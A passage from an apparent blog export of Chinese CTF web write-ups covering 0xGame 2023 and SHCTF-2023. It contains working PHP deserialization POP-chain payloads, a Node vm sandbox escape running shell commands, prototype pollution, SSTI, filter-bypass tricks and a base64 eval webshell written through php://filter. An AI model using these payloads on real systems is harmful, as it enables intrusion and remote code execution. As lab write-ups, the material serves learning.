并使得 $storage-\u0026gt;store = \u0026amp;$cache2-\u0026gt;expired 最终通过调用 cache2 的 expired 方法实现 RCE 由于源代码比较长，出题人给了很多hint\n源代码👇\n\u0026lt;?php\rshow_source(__FILE__);\rclass Cache {\rpublic $key;\rpublic $value;\rpublic $expired;\rpublic $helper;\rpublic function __construct($key, $value, $helper) {\r$this-\u0026gt;key = $key;\r$this-\u0026gt;value = $value;\r$this-\u0026gt;helper = $helper;\r$this-\u0026gt;expired = False;\r}\rpublic function __wakeup() {\r$this-\u0026gt;expired = False;\r}\rpublic function expired() {\rif ($this-\u0026gt;expired) {\r$this-\u0026gt;helper-\u0026gt;clean($this-\u0026gt;key);\rreturn True;\r} else {\rreturn False;\r}\r}\r}\rclass Storage {\rpublic $store;\rpublic function __construct() {\r$this-\u0026gt;store = array();\r}\rpublic function __set($name, $value) {\rif (!$this-\u0026gt;store) {\r$this-\u0026gt;store = array();\r}\rif (!$value-\u0026gt;expired()) {\r$this-\u0026gt;store[$name] = $value;\r}\r}\rpublic function __get($name) {\rreturn $this-\u0026gt;data[$name];\r}\r}\rclass Helper {\rpublic $funcs;\rpublic function __construct($funcs) {\r$this-\u0026gt;funcs = $funcs;\r}\rpublic function __call($name, $args) {\r$this-\u0026gt;funcs[$name](...$args);\r}\r}\rclass DataObject {\rpublic $storage;\rpublic $data;\rpublic function __destruct() {\rforeach ($this-\u0026gt;data as $key =\u0026gt; $value) {\r$this-\u0026gt;storage-\u0026gt;$key = $value;\r}\r}\r}\rif (isset($_GET[\u0026#39;u\u0026#39;])) {\runserialize($_GET[\u0026#39;u\u0026#39;]);\r}\r?\u0026gt; 在hint里面已经给出pop链条了，这里就不再分析了，就只是对几个函数的利用讲一下\n首先是destruct函数里面的foreach，是遍历一个数组，然后数组里面应该是以键值对的形式存储\n然后进入Storage类里的set魔术方法，里面有执行value参数的expired函数，那么这个value参数就应该是cache2\ncache类里有wakeup方法，可以通过其他属性引用expired的地址，然后修改该属性的值即可绕过\n最后注意：$this-\u0026gt;helper-\u0026gt;clean($this-\u0026gt;key); 这个跳入Helper类里的时候传入的name是clean，args是key，需要在helper类里的funcs也设置为一个数组，存有键名为clean的键值对\n最终生成paylaod👇\n$cache1=new Cache();\r$cache2=new Cache();\r$storage=new Storage();\r$helper=new Helper();\r$dataobject=new DataObject();\r$dataobject-\u0026gt;storage=$storage;\r$storage-\u0026gt;store=\u0026amp;$cache2-\u0026gt;expired;\r$dataobject-\u0026gt;data=[\u0026#39;1\u0026#39;=\u0026gt;$cache1,\u0026#39;2\u0026#39;=\u0026gt;$cache2];\r$helper-\u0026gt;funcs=[\u0026#39;clean\u0026#39;=\u0026gt;\u0026#39;passthru\u0026#39;];\r$cache2-\u0026gt;value=\u0026amp;$cache2-\u0026gt;expired;\r$cache2-\u0026gt;value=True;\r$cache2-\u0026gt;helper=$helper;\r$cache2-\u0026gt;key=\u0026#39;cat /proc/self/environ\u0026#39;;\recho serialize($dataobject).PHP_EOL; flag在环境变量里\nez_sandbox #\rhint👇\nHint 1: 原型链污染 (除了 __proto__ 还有其它方法)\rHint 2: vm 沙箱逃逸 (arguments.callee.caller)\rHint 3: 在沙箱内可以通过 throw 来抛出一个对象 这个对象会被沙箱外的 catch 语句捕获 然后会访问它的 message 属性 (即 e.message)\rHint 4: 通过 JavaScript 的 Proxy 类或对象的 __defineGetter__ 方法来设置一个 getter 使得在沙箱外访问 e 的 message 属性 (即 e.message) 时能够调用某个函数\rHint 5: 通过 constructor.prototype 绕过 __proto__ 进行原型链污染\rHint 6: https://xz.aliyun.com/t/11859 一个js框架的界面，在源码中可以看到proto是被过滤掉了\n不过这道题使用污染的地方不在register。。。在这里困了好久\n应该是先去注册一个用户，然后在login界面进行原型链污染，由于proto被ban了，那就只有使用constructor来进行污染，要先注册一个test用户，然后再在login界面抓包上传下面的json部分\n{\r\u0026#34;username\u0026#34;: \u0026#34;test\u0026#34;,\r\u0026#34;password\u0026#34;: \u0026#34;test\u0026#34;,\r\u0026#34;constructor\u0026#34;: {\r\u0026#34;prototype\u0026#34;: {\r\u0026#34;test\u0026#34;: \u0026#34;123\u0026#34;\r}\r}\r} 再用污染的用户密码登录进去，就能以admin的身份进去\n源代码里过滤掉了常见的函数，但是js是可以通过字符串拼接的方式来获得函数名\n官方wp👇\n// method 1\rthrow new Proxy({}, { // Proxy 对象⽤于创建对某⼀对象的代理, 以实现属性和⽅法的拦截\rget: function(){ // 访问这个对象的任意⼀个属性都会执⾏ get 指向的函数\rconst c = arguments.callee.caller\rconst p = (c[\u0026#39;constru\u0026#39;+\u0026#39;ctor\u0026#39;][\u0026#39;constru\u0026#39;+\u0026#39;ctor\u0026#39;](\u0026#39;return pro\u0026#39;+\u0026#39;cess\u0026#39;))()\rreturn p[\u0026#39;mainM\u0026#39;+\u0026#39;odule\u0026#39;][\u0026#39;requi\u0026#39;+\u0026#39;re\u0026#39;](\u0026#39;child_pr\u0026#39;+\u0026#39;ocess\u0026#39;)[\u0026#39;ex\u0026#39;+\u0026#39;ecSync\u0026#39;](\u0026#39;cat\r/flag\u0026#39;).toString();\r}\r})\r// method 2\rlet obj = {} // 针对该对象的 message 属性定义⼀个 getter, 当访问 obj.message 时会调⽤对应的函数\robj.__defineGetter__(\u0026#39;message\u0026#39;, function(){\rconst c = arguments.callee.caller\rconst p = (c[\u0026#39;constru\u0026#39;+\u0026#39;ctor\u0026#39;][\u0026#39;constru\u0026#39;+\u0026#39;ctor\u0026#39;](\u0026#39;return pro\u0026#39;+\u0026#39;cess\u0026#39;))()\rreturn p[\u0026#39;mainM\u0026#39;+\u0026#39;odule\u0026#39;][\u0026#39;requi\u0026#39;+\u0026#39;re\u0026#39;](\u0026#39;child_pr\u0026#39;+\u0026#39;ocess\u0026#39;)[\u0026#39;ex\u0026#39;+\u0026#39;ecSync\u0026#39;](\u0026#39;cat\r/flag\u0026#39;).toString();\r})\rthrow obj WEEK3 #\rGoShop #\rHint 1: 注意 int64 类型的范围 两个 int 64 进行计算的时候会不会出现什么问题?\rHint 2: 整数溢出 int64的最大值：9223372036854775807\n先造成整数溢出，买了很多个橘子，然后把他们卖掉再买flag就行了\nWEEK4 #\rspring #\r一个spring框架的网站，进入url后给出提示\n经过搜索了解到这是一个spring的未授权访问漏洞，可以修改url后面的路由来访问\n首先访问/actuator/env 读取环境信息\n可以看到flag在password里，但是被加密了，是看不到的，然后访问/actuator/heapdump路由\nheapdump是一个内存文件，将其下载下来，正常情况是无法分析的，需要下载一个Eclipse Memory Analyzer分析java的软件才能看到\n在app.password对应的value部分找到flag\n相关链接：springboot actuator未授权访问 - 安全课-信仰 - 博客园 (cnblogs.com)\n【精选】Springboot信息泄露以及heapdump的利用_heapdump漏洞_李白你好的博客-CSDN博客\n","date":"2023-10-07","externalUrl":null,"permalink":"/posts/2023/10/0xgame-2023/","section":"Posts","summary":"","title":"0xGame 2023","type":"posts"},{"content":"\r前言 #\r写完week1感觉还是比较简单的，很基础\n也是放假在家不想打游戏，拿这个消磨一下时间\nWEEK1 #\rbabyRCE #\r题目源码\n\u0026lt;?php\r$rce = $_GET[\u0026#39;rce\u0026#39;];\rif (isset($rce)) {\rif (!preg_match(\u0026#34;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\\;|[0-9]|\\*|\\`|\\%|\\\u0026gt;|\\\u0026lt;|\\\u0026#39;|\\\u0026#34;/i\u0026#34;, $rce)) {\rsystem($rce);\r}else {\recho \u0026#34;hhhhhhacker!!!\u0026#34;.\u0026#34;\\n\u0026#34;;\r}\r} else {\rhighlight_file(__FILE__);\r} 过滤了部分命令和特殊符号\n但是没有过滤掉反斜杠（ \\ ），空格我们可以用$IFS来绕过\n然后查看文件的命令几乎都被禁了，但是可以通过反斜杠来连接字母形成命令\nca\\t = cat ， l\\s = ls #诸如此类 另外空格的一些绕过方式\n$IFS\r$IFS$1\r${IFS}\r$IFS$9\r\u0026lt; 比如cat\u0026lt;a.tct:表示cat a.txt\r\u0026lt;\u0026gt;\r{cat,flag.php} //用逗号实现了空格功能，需要用{}括起来\r%20\r%09 这里当前目录下有一个flag.php，但是不正确\n正确的在根目录下\n拿到flag\n1zzphp #\r\u0026lt;?php error_reporting(0);\rhighlight_file(\u0026#39;./index.txt\u0026#39;);\rif(isset($_POST[\u0026#39;c_ode\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;num\u0026#39;]))\r{\r$code = (String)$_POST[\u0026#39;c_ode\u0026#39;];\r$num=$_GET[\u0026#39;num\u0026#39;];\rif(preg_match(\u0026#34;/[0-9]/\u0026#34;, $num))\r{\rdie(\u0026#34;no number!\u0026#34;);\r}\relseif(intval($num))\r{\rif(preg_match(\u0026#39;/.+?SHCTF/is\u0026#39;, $code))\r{\rdie(\u0026#39;no touch!\u0026#39;);\r}\rif(stripos($code,\u0026#39;2023SHCTF\u0026#39;) === FALSE)\r{\rdie(\u0026#39;what do you want\u0026#39;);\r}\recho $flag;\r}\r} preg_match的绕过方式一般有（数组绕过、换行绕过、回溯溢出）\n在这里num可以通过数组绕过\n然是code就不行了，因为code是强制转换为string类型了，如果以数组的形式传入，那么code的值将变为Array，这个可以自己在本地测试\n然后注意preg_match的匹配方式是is，i是忽略大小写，s是忽略换行符\n那么这里就只有尝试回溯溢出这个方法了\n具体的在P神的博客里有，这里就不再赘述\n链接：PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌 (leavesongs.com)\n具体的操作就是在code部分生成至少1000000（一百万）个字符，这是preg_match的最大深度，超过则不匹配\n最终如图👇\nez_serialize #\r题目源码👇\n\u0026lt;?php\rhighlight_file(__FILE__);\rclass A{\rpublic $var_1;\rpublic function __invoke(){\rinclude($this-\u0026gt;var_1);\r}\r}\rclass B{\rpublic $q;\rpublic function __wakeup()\r{\rif(preg_match(\u0026#34;/gopher|http|file|ftp|https|dict|\\.\\./i\u0026#34;, $this-\u0026gt;q)) {\recho \u0026#34;hacker\u0026#34;; }\r}\r}\rclass C{\rpublic $var;\rpublic $z;\rpublic function __toString(){\rreturn $this-\u0026gt;z-\u0026gt;var;\r}\r}\rclass D{\rpublic $p;\rpublic function __get($key){\r$function = $this-\u0026gt;p;\rreturn $function();\r} }\rif(isset($_GET[\u0026#39;payload\u0026#39;]))\r{\runserialize($_GET[\u0026#39;payload\u0026#39;]);\r}\r?\u0026gt; 可以看到在A类里有include函数，我们可以通过include来执行命令，这就是pop链的终点\n整理一下思路可以看出\n我们要先通过B类的wakeup，执行preg_match函数，该函数会把B-\u0026gt;q作为字符串进行匹配，然后就跳到C类的toString方法，该方法要return一个不存在的属性值，从而触发D类的__get魔术方法，该方法会把p属性当作函数返回，触发A类的__invoke魔术方法，最终进入include\nPOP链条：B:wakeup() -\u0026gt; C:toString() -\u0026gt; D:__get() -\u0026gt; A:__invoke -\u0026gt; include 最终如何读取文件？这里没有过滤掉filter，可以用他来读取文件\n最终payload：\n\u0026lt;?php\rclass A{\rpublic $var_1;\r}\rclass B{\rpublic $q;\r}\rclass C{\rpublic $var;\rpublic $z;\r}\rclass D{\rpublic $p;\r}\r$b=new B();\r$c=new C();\r$b-\u0026gt;q=$c;\r$d=new D();\r$c-\u0026gt;z=$d;\r$a=new A();\r$d-\u0026gt;p=$a;\r$a-\u0026gt;var_1=\u0026#39;php://filter/convert.base64-encode/resource=flag.php\u0026#39;;\recho serialize($b); 拿去Base64解码即可\n登录就给flag #\r经过测试，不存在sql注入，后台也扫不出东西来\n应该是密码爆破，用户名猜测是admin\n抓个包，发到Intruder，使用Sniper单参数模式\n在Payloads里选择密码这一栏，然后开始攻击\n可以看到当密码是password的时候返回长度和状态码都不一样\n密码应该就是password，登录进去拿到flag👇\n飞机大战 #\r一个飞机游戏\n看看源码吧，这种题一般都在源码里找突破口\n有一个main.js文件，进去看看，在最后找到一个flag关键词，好像是要scores要大于99999才弹出flag\n这里其实我们只需要打开浏览器的控制台，将scores的值修改一下就行了\nezphp #\r源码如下👇\n\u0026lt;?php\rerror_reporting(0);\rif(isset($_GET[\u0026#39;code\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;pattern\u0026#39;]))\r{\r$pattern=$_POST[\u0026#39;pattern\u0026#39;];\rif(!preg_match(\u0026#34;/flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\\.|\\`|read*|show|file|\\\u0026lt;|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\\/| |\\?|mv|cp|next|show_source|highlight_file|glob|\\~|\\^|\\||\\\u0026amp;|\\*|\\%/i\u0026#34;,$code))\r{\r$code=$_GET[\u0026#39;code\u0026#39;];\rpreg_replace(\u0026#39;/(\u0026#39; . $pattern . \u0026#39;)/ei\u0026#39;,\u0026#39;print_r(\u0026#34;\\\\1\u0026#34;)\u0026#39;, $code);\recho \u0026#34;you are smart\u0026#34;;\r}else{\rdie(\u0026#34;try again\u0026#34;);\r}\r}else{\rdie(\u0026#34;it is begin\u0026#34;);\r}\r?\u0026gt; 一眼看到preg_match的ei模式，其实这个e模式是有命令执行的漏洞的\n可以参考文章：深入研究preg_replace \\e模式下的代码执行_preg_replace /e-CSDN博客\n对于这三个参数的解释：\npreg_replace(正则表达式，原本的字符串，用于替换的字符串); 如果在原本的字符串中正则匹配成功，就将其替换\n而/e模式能够顺便执行替换字符串（如果是正确的命令哈\n具体的也不多说了，上面参考文章写的肯定比我好\n在phpinfo里找到flag\n生成你的邀请函吧 #\r题目描述：\nAPI：url/generate_invitation Request：POST application/json Body：{ \u0026#34;name\u0026#34;: \u0026#34;Yourname\u0026#34;, \u0026#34;imgurl\u0026#34;: \u0026#34;http://q.qlogo.cn/headimg_dl?dst_uin=QQnumb\u0026amp;spec=640\u0026amp;img_type=jpg\u0026#34; } 根据题目描述，我们要使用靶机实例的该API，POST发送请求\n还是很简单的\n抓个包修改一下即可\n发送完后，浏览器会下载一张图片，在底部发现flag\nWEEK2 #\rno_wake_up #\rphp代码如下\n\u0026lt;?php\rhighlight_file(__FILE__);\rclass flag{\rpublic $username;\rpublic $code;\rpublic function __wakeup(){\r$this-\u0026gt;username = \u0026#34;guest\u0026#34;;\r}\rpublic function __destruct(){\rif($this-\u0026gt;username = \u0026#34;admin\u0026#34;){\rinclude($this-\u0026gt;code);\r}\r}\r}\runserialize($_GET[\u0026#39;try\u0026#39;]); 在反序列化后会先执行wakeup，然后再执行destruct\n在destruct里存在命令执行，这里只需要绕过wakeup就行了\n经典的只需要把序列化字符串的变量值改大一个就可以了\n但是这道题不知道怎么了，直接生成的字符串就能打进去\nbase64解码拿到flag\nMD5的事就拜托了 #\r源码如下\n\u0026lt;?php\rhighlight_file(__FILE__);\rinclude(\u0026#34;flag.php\u0026#34;);\rif(isset($_POST[\u0026#39;SHCTF\u0026#39;])){\rextract(parse_url($_POST[\u0026#39;SHCTF\u0026#39;]));\rif($$$scheme===\u0026#39;SHCTF\u0026#39;){\recho(md5($flag));\recho(\u0026#34;\u0026lt;/br\u0026gt;\u0026#34;);\r}\rif(isset($_GET[\u0026#39;length\u0026#39;])){\r$num=$_GET[\u0026#39;length\u0026#39;];\rif($num*100!=intval($num*100)){\recho(strlen($flag));\recho(\u0026#34;\u0026lt;/br\u0026gt;\u0026#34;);\r}\r}\r}\rif($_POST[\u0026#39;SHCTF\u0026#39;]!=md5($flag)){\rif($_POST[\u0026#39;SHCTF\u0026#39;]===md5($flag.urldecode($num))){\recho(\u0026#34;flag is\u0026#34;.$flag);\r}\r} 先get传参length=1.000001，得出flag的长度为42\n注意这这个parse_url的用法，是将一个url分解为几个部分，然后用extract将变量引入环境\n举个例子\n\u0026lt;?php$url = \u0026#39;http://username:password@hostname/path?arg=value#anchor\u0026#39;;print_r(parse_url($url));echo parse_url($url, PHP_URL_PATH);?\u0026gt;\r#那么结果就应该是\rArray\r(\r[scheme] =\u0026gt; http\r[host] =\u0026gt; hostname\r[user] =\u0026gt; username\r[pass] =\u0026gt; password\r[path] =\u0026gt; /path\r[query] =\u0026gt; arg=value\r[fragment] =\u0026gt; anchor\r) 至于这个scheme前面的几个$符号，比如说$scheme=1，那么$$scheme相当于$1，$scheme的值就被作为变量名称再次被利用\n下面是测试代码\n\u0026lt;?php\rprint_r(parse_url(\u0026#34;host://SHCTF:password@user\u0026#34;));\rextract(parse_url(\u0026#34;host://SHCTF:password@user\u0026#34;));\recho $scheme.PHP_EOL;\recho $$scheme.PHP_EOL;\recho $$$scheme.PHP_EOL;\r#输出如下\rArray\r(\r[scheme] =\u0026gt; host\r[host] =\u0026gt; user\r[user] =\u0026gt; SHCTF\r[pass] =\u0026gt; password\r)\rhost\ruser\rSHCTF 那么这个字符串就可以传入POST了，拿到MD5值\n到这里的话，就没思路了，下面是官方的wp\nEasyCMS #\r进去是一个类似博客的界面\n进行信息搜集，发现这个taoCMS存在漏洞\n贴一个文章：taoCMS任意代码执行（CVE-2022-25578）-CSDN博客\n访问后台管理登录页面，默认账号admin，密码是tao\n在这里可以执行sql\n不过flag不在当前数据库，在另外一个数据库中，可以用show查看\n但是这里想查ctftraining库里的东西的时候，他就不回显了，不知道是不是没有东西\n然后注意到左下角有个文件管理，里面可以编辑文件内容，可以在这里做木马\n再去访问install.php即可命令执行\nez_ssti #\r吐槽一下：这道题什么东西都没有，传参都不知道传什么，后来还是搜题目才找到传name\n也没什么好写的，直接拿以前写过的payload就爆出来了，甚至都不用跑脚本。。。\n?name={{lipsum.__globals__.__getitem__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat /f*\u0026#39;).read()}} serialize #\r代码如下👇\n\u0026lt;?php\rhighlight_file(__FILE__);\rclass misca{\rpublic $gao;\rpublic $fei;\rpublic $a;\rpublic function __get($key){\r$this-\u0026gt;miaomiao();\r$this-\u0026gt;gao=$this-\u0026gt;fei;\rdie($this-\u0026gt;a);\r}\rpublic function miaomiao(){\r$this-\u0026gt;a=\u0026#39;Mikey Mouse~\u0026#39;;\r}\r}\rclass musca{\rpublic $ding;\rpublic $dong;\rpublic function __wakeup(){\rreturn $this-\u0026gt;ding-\u0026gt;dong;\r}\r}\rclass milaoshu{\rpublic $v;\rpublic function __tostring(){\recho\u0026#34;misca~musca~milaoshu~~~\u0026#34;;\rinclude($this-\u0026gt;v);\r}\r}\rfunction check($data){\rif(preg_match(\u0026#39;/^O:\\d+/\u0026#39;,$data)){\rdie(\u0026#34;you should think harder!\u0026#34;);\r}\relse return $data;\r}\runserialize(check($_GET[\u0026#34;wanna_fl.ag\u0026#34;])); 先不管这个check函数，理清一下pop链\n我们能够利用的是milaoshu里的include函数，他是被tostring触发的，而全看下来，能够触发tostring方法的也只有misca类里的die方法，该方法把参数以字符串输出，想要执行的话就要执行get魔术方法，这里要从musca类里的wakeup函数里调过来\n所以总的pop链条就是\nmusca-\u0026gt;__wakeup() #1\rmisca-\u0026gt;__get() #2\rmilaoshu-\u0026gt;include() #3 不过要注意的是在misca的get方法里，die能够输出的a参数是被miaomiao()函数重新赋值了\n这里直接赋值a是不管用的，就只有使用取地址的方式，把gao的值取为a的地址，这样当赋值给gao的时候也就是赋值给了a，绕过了miaomiao函数\n\u0026lt;?php\rclass misca{\rpublic $gao;\rpublic $fei;\rpublic $a;\rpublic function miaomiao(){\r$this-\u0026gt;a=\u0026#39;Mikey Mouse~\u0026#39;;\r}\r}\rclass musca{\rpublic $ding;\rpublic $dong;\r}\rclass milaoshu{\rpublic $v=\u0026#39;php://filter/convert.base64-encode/resource=flag.php\u0026#39;;\r}\r$misca=new misca();\r$musca=new musca();\r$milaoshu=new milaoshu();\r$musca-\u0026gt;ding=$misca;\r$misca-\u0026gt;gao=\u0026amp;$misca-\u0026gt;a;\r$misca-\u0026gt;fei=$milaoshu;\recho serialize($musca);\r#O:5:\u0026#34;musca\u0026#34;:2:{s:4:\u0026#34;ding\u0026#34;;O:5:\u0026#34;misca\u0026#34;:3:{s:3:\u0026#34;gao\u0026#34;;N;s:3:\u0026#34;fei\u0026#34;;O:8:\u0026#34;milaoshu\u0026#34;:1:{s:1:\u0026#34;v\u0026#34;;s:52:\u0026#34;php://filter/convert.base64-encode/resource=flag.php\u0026#34;;}s:1:\u0026#34;a\u0026#34;;R:3;}s:4:\u0026#34;dong\u0026#34;;N;} 生成的pop链初步是这样的，不过这样是无法通过check函数\n经过几番搜寻，发现在以前的CTF的题里面出现过这个考点\npreg_match(\u0026#39;/^O:\\d+/\u0026#39;)的绕过方式\r1、利用加号绕过（注意在 url 里传参时 + 要编码为 %2B）#php版本大于5.6就不行了好像\r2、serialize(array(a));a 为要反序列化的对象 (序列化结果开头是 a，不影响作为数组元素的 $a 的析构) #这个就可以 最终poc如下👇\n\u0026lt;?php\rclass misca{\rpublic $gao;\rpublic $fei;\rpublic $a;\rpublic function miaomiao(){\r$this-\u0026gt;a=\u0026#39;Mikey Mouse~\u0026#39;;\r}\r}\rclass musca{\rpublic $ding;\rpublic $dong;\r}\rclass milaoshu{\rpublic $v=\u0026#39;php://filter/convert.base64-encode/resource=flag.php\u0026#39;;\r}\r$misca=new misca();\r$musca=new musca();\r$milaoshu=new milaoshu();\r$musca-\u0026gt;ding=$misca;\r$misca-\u0026gt;gao=\u0026amp;$misca-\u0026gt;a;\r$misca-\u0026gt;fei=$milaoshu;\recho serialize($musca);\recho PHP_EOL;\r$x=serialize(array($musca));\recho $x;\r#a:1:{i:0;O:5:\u0026#34;musca\u0026#34;:2:{s:4:\u0026#34;ding\u0026#34;;O:5:\u0026#34;misca\u0026#34;:3:{s:3:\u0026#34;gao\u0026#34;;N;s:3:\u0026#34;fei\u0026#34;;O:8:\u0026#34;milaoshu\u0026#34;:1:{s:1:\u0026#34;v\u0026#34;;s:52:\u0026#34;php://filter/convert.base64-encode/resource=flag.php\u0026#34;;}s:1:\u0026#34;a\u0026#34;;R:4;}s:4:\u0026#34;dong\u0026#34;;N;}} WEEK3 #\r快问快答 #\r写个脚本爆破就行，但是既不能太快也不能太慢，服务器好像撑不住。。。\nimport re\rimport time\rimport requests\rsession=requests.session()\rurl=\u0026#39;http://112.6.51.212:31707\u0026#39;\rpattern=re.compile(\u0026#39;(\\d+) (.+) (\\d+) =\u0026#39;)\rresult=0\rpayload={\u0026#34;answer\u0026#34;:f\u0026#39;{result}\u0026#39;}\rfor i in range(65):\rtime.sleep(1)\rtry:\rr=session.post(url,payload)\rprint(r.text)\rcalc=re.findall(pattern,r.text)[0]\rnum1=calc[0]\rsym=calc[1]\rnum2=calc[2]\rif \u0026#39;异或\u0026#39; == sym:\rresult=int(num1)^int(num2)\rif \u0026#39;与\u0026#39; == sym:\rresult=int(num1)\u0026amp;int(num2)\rif \u0026#39;÷\u0026#39; ==sym:\rresult=int(int(num1)/int(num2))\rif \u0026#39;x\u0026#39; ==sym:\rresult=int(num1)*int(num2)\rif \u0026#39;+\u0026#39; == sym:\rresult = int(num1) + int(num2)\rif \u0026#39;-\u0026#39; ==sym:\rresult = int(num1) - int(num2)\rpayload = {\u0026#34;answer\u0026#34;: f\u0026#39;{result}\u0026#39;}\rprint(i,calc,result)\rexcept IndexError :\rprint(r.text)\rprint(\u0026#39;indexx error\u0026#39;)\rexit()\rexcept InterruptedError:\rprint(\u0026#34;interupt\u0026#34;)\relse:\rpass\rtime.sleep(0.5)\rprint(r.text)\rprint(r.cookies) sseerriiaalliizzee #\rphp源码如下👇\n\u0026lt;?php\rerror_reporting(0);\rhighlight_file(__FILE__);\rclass Start{\rpublic $barking;\rpublic function __construct(){\r$this-\u0026gt;barking = new Flag;\r}\rpublic function __toString(){\rreturn $this-\u0026gt;barking-\u0026gt;dosomething();\r}\r}\rclass CTF{ public $part1;\rpublic $part2;\rpublic function __construct($part1=\u0026#39;\u0026#39;,$part2=\u0026#39;\u0026#39;) {\r$this -\u0026gt; part1 = $part1;\r$this -\u0026gt; part2 = $part2;\r}\rpublic function dosomething(){\r$useless = \u0026#39;\u0026lt;?php die(\u0026#34;+Genshin Impact Start!+\u0026#34;);?\u0026gt;\u0026#39;;\r$useful= $useless. $this-\u0026gt;part2;\rfile_put_contents($this-\u0026gt; part1,$useful);\r}\r}\rclass Flag{\rpublic function dosomething(){\rinclude(\u0026#39;./flag,php\u0026#39;);\rreturn \u0026#34;barking for fun!\u0026#34;;\r}\r}\r$code=$_POST[\u0026#39;code\u0026#39;]; if(isset($code)){\recho unserialize($code);\r}\relse{\recho \u0026#34;no way, fuck off\u0026#34;;\r}\r?\u0026gt; 关键点在于CTF类里的dosomething函数，这里面有一个file_put_contents可以利用\n但是文件内容是有一个die函数，当我们访问生成的文件时，走到die函数就结束，自己写的内容就无效了\n这里贴一个博客：file_put_contents利用技巧(php://filter协议） - yokan - 博客园 (cnblogs.com)讲的很不错的\n这里就利用filter伪协议搭配过滤器绕过这个file_put_contents就可以了\n生成反序列化字符串的poc👇\n\u0026lt;?php\rclass Start{\rpublic $barking;\r}\rclass CTF{\rpublic $part1=\u0026#39;php://filter/write=string.strip_tags|convert.base64-decode/resource=hyh.php\u0026#39;;\rpublic $part2=\u0026#39;PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==\u0026#39;;# @eval($_POST[a]);\r}\r$a=new Start();\r$b=new CTF();\r$a-\u0026gt;barking=$b;\recho serialize($a);\r#O:5:\u0026#34;Start\u0026#34;:1:{s:7:\u0026#34;barking\u0026#34;;O:3:\u0026#34;CTF\u0026#34;:2:{s:5:\u0026#34;part1\u0026#34;;s:75:\u0026#34;php://filter/write=string.strip_tags|convert.base64-decode/resource=hyh.php\u0026#34;;s:5:\u0026#34;part2\u0026#34;;s:36:\u0026#34;PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==\u0026#34;;}} gogogo #\r这道题的话，网上也能搜到类似的题目\n由于没有打通，这里还是贴一下官方的wp\ngo语言的环境要自己安装，安装好后把题目附件里的代码session部分修改如图\n然后会跑出来一个cookie，这里burp更换cookie即可绕过第一关\n","date":"2023-10-02","externalUrl":null,"permalink":"/posts/2023/10/shctf-2023/","section":"Posts","summary":"","title":"SHCTF-2023","type":"posts"},{"content":"\rWeek1 #\r泄漏的秘密 #\rhint：粗心的网站管理员总会泄漏一些敏感信息在Web根目录下\n访问该网站目录下的robots.txt可以找到第一部分的flag\n扫描一下后台，发现www.zip备份文件，将其下载下来，在index.php中发现第二部分flag\nBegin of Upload #\rhint：普通的上传啦，平平淡淡才是真\n在网页源代码里发现前端检测的脚本\n我这里用的是Edge浏览器，可以在设置里关掉JavaScript，然后刷新一下页面\n然后就能上传任意文件，他这里没有后端检测\n根目录下拿到flag\nBegin of HTTP #\rhint：最初的开始\nhackbar传参就行\nsecret在网页源代码里的注释里\n\u0026lt;!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --\u0026gt; base64解密一下再传参就行\nF12打开网络，查看当前页面的消息头，在cookie里面发现power参数\nhackbar里可以传cookie\n浏览器就是user agent\n从某个网站来访问用Referer表示\n到这里，我的hackbar就无法用了，可能是版本太老，还是得打开burpsuite，抓一下目前的hackbar里的包\n本地用户伪造的话，比较常见的就是X-Forwaded-For (经典的XFF头)，或者Client-Ip等等\n这里能使用的是X-Real-Ip，抓个包添加这个header就能得到flag\n最终如图👇\nErrorFlask #\rhint：Err\u0026hellip;\u0026hellip;..\n进去题目要求传number1和number2来进行加法操作\n但是根据题目，只需要传一个参数来导致代码报错，然后进入debug模式就行了\nBegin of PHP #\rhint：PHP是世界上最安全的语言，真的吗？\nif(isset($_GET[\u0026#39;key1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;key2\u0026#39;])){\recho \u0026#34;=Level 1=\u0026lt;br\u0026gt;\u0026#34;;\rif($_GET[\u0026#39;key1\u0026#39;] !== $_GET[\u0026#39;key2\u0026#39;] \u0026amp;\u0026amp; md5($_GET[\u0026#39;key1\u0026#39;]) == md5($_GET[\u0026#39;key2\u0026#39;])){\r$flag1 = True;\r}else{\rdie(\u0026#34;nope,this is level 1\u0026#34;);\r}\r} 这里要求key1不等于key2，然后MD5值要弱相等，简单一点的话就是将key1和key2都以数组的形式传参，MD5是加密数组会返回NULL，所以后半部分就变成了 NULL==NULL\n另一个方法就是md5碰撞，由于后面为弱比较只比较变量值数值，只需要用两个MD5值为0e开头的就能绕过（科学计数法，0e开头的计算值都是0）\n这里用数组就行\nif($flag1){\recho \u0026#34;=Level 2=\u0026lt;br\u0026gt;\u0026#34;;\rif(isset($_POST[\u0026#39;key3\u0026#39;])){\rif(md5($_POST[\u0026#39;key3\u0026#39;]) === sha1($_POST[\u0026#39;key3\u0026#39;])){\r$flag2 = True;\r}\r}else{\rdie(\u0026#34;nope,this is level 2\u0026#34;);\r}\r} SHA1和MD5一样都是不能加密数组的，都会返回NULL，然而这里是强比较，只能用数组绕过\nif($flag2){\recho \u0026#34;=Level 3=\u0026lt;br\u0026gt;\u0026#34;;\rif(isset($_GET[\u0026#39;key4\u0026#39;])){\rif(strcmp($_GET[\u0026#39;key4\u0026#39;],file_get_contents(\u0026#34;/flag\u0026#34;)) == 0){\r$flag3 = True;\r}else{\rdie(\u0026#34;nope,this is level 3\u0026#34;);\r}\r}\r} strcmp比较的是字符串类型，如果强行传入其他类型参数，会出错，出错后返回值0，一样用数组绕过\nif($flag3){\recho \u0026#34;=Level 4=\u0026lt;br\u0026gt;\u0026#34;;\rif(isset($_GET[\u0026#39;key5\u0026#39;])){\rif(!is_numeric($_GET[\u0026#39;key5\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;key5\u0026#39;] \u0026gt; 2023){\r$flag4 = True;\r}else{\rdie(\u0026#34;nope,this is level 4\u0026#34;);\r}\r}\r} 